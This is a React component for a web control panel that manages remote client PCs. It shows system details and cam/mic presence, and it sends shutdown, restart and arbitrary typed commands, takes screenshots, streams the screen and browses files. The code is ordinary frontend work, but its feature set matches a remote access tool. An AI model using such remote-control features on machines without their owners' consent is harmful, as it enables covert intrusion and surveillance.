import React, { Component } from 'react';
import withRouter from "./withRouter";
import "./ClientSettings.css"

class ClientSettings extends Component {


	constructor(props) {

		super(props);
		this.state = { client: undefined, loading: true };

		this.populateClientData = this.populateClientData.bind(this);
		this.sendControl = this.sendControl.bind(this);
		this.onSendCmdClick = this.onSendCmdClick.bind(this);
	}

	componentDidMount() {
		this.populateClientData();
	}

	async populateClientData() {
		const response = await fetch(`/api/client/management/${this.props.params.clientId}`);
		const data = await response.json();
		this.setState({ client: data, loading: false });
	}

	getTimeStringFromTicks(ticksInSecs) {

		function pad(n, width) {
			n = n + '';
			return n.length >= width ? n : new Array(width - n.length + 1).join('0') + n;
		}

		var seconds = ticksInSecs / 1000;
		var dd = (Math.floor(seconds / 86400)).toFixed(0);
		seconds -= dd * 86400;
		var hh = (Math.floor(seconds / 3600)).toFixed(0);
		var mm = (Math.floor((seconds % 3600) / 60)).toFixed(0);
		var ss = (seconds % 60).toFixed(0);

		return pad(dd, 2) + " d, " + pad(hh, 2) + " h, " + pad(mm, 2) + " m, " + pad(ss, 2) + " s";
	}

	onSendCmdClick() {
		var btns =
			[
				{ text: "(force offline) Send", className: "", callback: (text) => { this.sendControl(text, 0, true) }, sendText: true },
				{ text: "Send", className: "", callback: (text) => { this.sendControl(text, 0, false) }, sendText: true }
			];

		window.dialoguePanel.show("Send a CMD", "Enter a command down below that you want this PC to execute.", btns, true);
	}

	async sendControl(command, type, forceOfflineSend) {

		var data = { command: command, forceOfflineSend: forceOfflineSend, type: type };

		var isOk;

		fetch(`/api/client/management/${this.props.params.clientId}/control`, {
			method: "POST",
			body: JSON.stringify(data),
			headers: {
				'Content-Type': 'application/json',
			},
		}).then(response =>
		{
			isOk = response.ok;
			return response.text()
		})
		.then(text =>
		{
			var notificationType = "inf";

			if (!isOk) {
				notificationType = "dng";
				text = `Request sending error: ${text}`;
			}

			window.notificationPanel.notify(text, notificationType);
		});
	}

	funcPreventDefault(event, func){
		event.preventDefault();
		func();
	}

	renderClient() {
		return (
			<div className="container mt-3">
				<div className="object client-settings-header">
					<img src={this.state.client.wallpaperPath} alt="client wallpaper" className="client-settings-image"></img>

					<button className="client-back-btn" onClick={() => { this.props.navigate("/") } }>
						<i className="bi bi-chevron-left" style={{transform: "translate(-0.15rem, 0)"} }></i>
					</button>

					<div className="client-btns-conrainer">
						<button className="icon-expand">
							<i className="bi bi-trash3-fill"></i>
						</button>
						<button className="icon-expand" onClick={() => { this.sendControl("shutdown /r /t 0") }} >
							<i className="bi bi-arrow-counterclockwise"></i>
						</button>
						<button className="icon-expand" onClick={() => { this.sendControl("shutdown /s /t 0") }}>
							<i className="bi bi-power"></i>
						</button>
					</div>

					<div className="client-settings-header-container">
						<h1 className="m-0">{this.state.client.hostname}</h1>
						<div className="online-container">
							<div className={(this.state.client.isOnline ? 'status-circle status-circle-online' : 'status-circle') + " mx-2"} />
							<h2 className="my-1">{this.state.client.isOnline ? "Online" : "Offline"}</h2>
						</div>
					</div>

					<div className="object mt-2 p-2 px-3 client-settings-box">

						<div className="info-box">

							<h1>Info:</h1>

							<div>
								{this.state.client.isOnline ? null :
									<p className="text-dng mb-1">
										<i class="bi bi-exclamation-triangle-fill me-2"></i>
										The data below doesn't make any sense because the client is offline.
										<i class="bi bi-exclamation-triangle-fill ms-2"></i>
									</p> }
								<p className="m-0">Last update: <span> </span>
									{new Date(this.state.client.lastUpdateUtcTime).toLocaleString("en-us",
										{
											year: "numeric", month: "short", day: "2-digit",
											hour: "2-digit", minute: "2-digit", second: "2-digit",
											hourCycle: "h24"
										})}
									<a href="" className="ms-1" onClick={event => this.funcPreventDefault(event, this.sendControl("UpdateClientData", 1, false))}>
										(update now)
									</a>
								</p>

								<p className="m-0">
									Os: {this.state.client.os}
								</p>

								<p className="m-0">
									System uptime: {this.getTimeStringFromTicks(this.state.client.uptimeTicks)}
								</p>

								<p className="m-0">
									Program uptime: {this.getTimeStringFromTicks(new Date() - new Date(Date.parse(this.state.client.programStartUtcTime)))}
								</p>

								<p className="m-0">
									Hostname: {this.state.client.hostname}
								</p>

								<p className="m-0">
									Local IP: {this.state.client.localIp}
									<a className="ms-1" href="" onClick={event => this.funcPreventDefault(event, this.sendControl("ipconfig /renew", 0, false))}>(renew)</a>
								</p>
								<p className="m-0">
									Public IP: {this.state.client.publicIp}
								</p>

								<p className="m-0">
									Program version: {this.state.client.programVersion}
								</p>

								<p className="m-0 mt-3">
									Cam -
									{
										this.state.client.hasCam ?
											<span className="text-succ ms-1">Yes</span> :
											<span className="text-dng ms-1">No</span>
									}
								</p>

								<p className="m-0">
									Mic -
									{
										this.state.client.hasMic ?
											<span className="text-succ ms-1">Yes</span> :
											<span className="text-dng ms-1">No</span>
									}
								</p>

								<p className="m-0">Check is online by program and network ping </p>
							</div>
						</div>

						<div className="btns-box">
							<button onClick={() => { this.sendControl("screenshot", 1, false) }}>screenshot</button>
							<button onClick={this.onSendCmdClick}>send cmd</button>
							<button onClick={ () => window.location = `/client/${this.state.client.id}/stream`}>Stream</button>
							<button>play sound</button>
							<button>send keys</button>
							<button onClick={() => window.location = `/client/${this.state.client.id}/filebrowser`}>browse files</button>
						</div>

					</div>
				</div>
			</div>
		);
	}

	render() {

		var contents = this.state.loading ?
			<div className="text-center">
				<h1 className="mt-3">Loading client data...</h1>

				<div className="spinner-border p-spinner" role="status">
					<span className="sr-only"></span>
				</div>
			</div> :
			this.renderClient();

		return contents;
	}

}

export default withRouter(ClientSettings);